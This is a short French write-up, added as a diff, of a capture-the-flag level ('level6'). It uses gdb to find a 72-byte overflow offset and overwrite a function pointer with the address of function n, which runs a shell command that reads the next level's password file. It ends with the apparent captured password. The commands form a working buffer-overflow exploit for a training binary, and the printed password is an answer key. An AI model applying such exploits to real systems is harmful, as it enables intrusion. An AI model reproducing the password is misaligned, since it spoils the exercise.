@@ -1,0 +1,36 @@
+Note: Installer peda si cela n'est pas deja fait.
+
+gdb ./level6
+
+info function:
+-----> Le binaire contient 3 fonctions (main, n et m).
+
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+
+b *0x080484ca
+
+r $(python -c "print('A' * 64)")
+x/600xb $esp
+On quit gdb et on y retourne.
+
+r $(python -c "print('A' * 76)")
+--> Segmentation fault. 0x41414141 in ?? ()
+r $(python -c "print('A' * 72 + 'BBBB')")
+--> Segmentation fault. 0x42424242 in ?? ()
+
+info function
+--> n: 0x08048454
+
+r $(python -c "print('\x90' * 72 + '\x54\x84\x04\x08')")
+-> [New process 6068]
+-> process 6068 is executing new program: /bin/dash
+-> [New process 6069]
+-> process 6069 is executing new program: /bin/cat
+-> /bin/cat: /home/user/level7/.pass: Permission denied
+
+On quite gdb.
+./level6 $(python -c "print('\x90' * 72 + '\x54\x84\x04\x08')")
+
+---> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
